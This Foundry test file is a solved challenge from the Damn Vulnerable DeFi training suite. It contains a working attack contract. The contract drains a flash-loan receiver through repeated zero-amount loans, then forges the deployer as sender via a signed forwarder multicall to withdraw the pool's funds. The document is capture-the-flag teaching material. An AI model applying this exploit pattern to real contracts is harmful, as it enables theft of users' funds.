// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // Deploy attack contract
        NaiveReceiverAttack attack = new NaiveReceiverAttack();

        // Execute attack to drain receiver and pool
        attack.attack(address(pool), address(receiver), recovery, forwarder, player, deployer, playerPk);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveReceiverAttack is Test {
    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    function attack(
        address pool,
        address receiver,
        address recovery,
        BasicForwarder forwarder,
        address player,
        address deployer,
        uint256 playerPk
    ) external {
        NaiveReceiverPool poolContract = NaiveReceiverPool(pool);
        WETH weth = poolContract.weth();

        // First drain the receiver with flash loans
        for (uint256 i = 0; i < 10; i++) {
            poolContract.flashLoan(IERC3156FlashBorrower(receiver), address(weth), 0, "");
        }

        // Prepare the withdrawal call that needs to appear from player
        bytes[] memory multicallData = new bytes[](1); // 10 flash loans + 1 withdraw
            // Add withdraw call
        multicallData[0] = abi.encodePacked(
            abi.encodeCall(poolContract.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer)))
        );

        bytes memory multicallEncoded = abi.encodeCall(poolContract.multicall, (multicallData));

        // Create and sign forwarder request
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player, //address(uint160(uint256(keccak256(abi.encodePacked(signerPk))))), // derive address from private key
            target: address(pool),
            value: 0,
            gas: 1000000,
            nonce: 0,
            data: multicallEncoded,
            deadline: block.timestamp + 1 hours
        });

        // Construct the digest manually
        bytes32 structHash = forwarder.getDataHash(request);
        bytes32 domainSeparator = forwarder.domainSeparator();
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));

        // Sign the digest
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute the meta-transaction
        forwarder.execute(request, signature);
    }
    // Required to receive ETH when unwrapping WETH

    receive() external payable {}
}
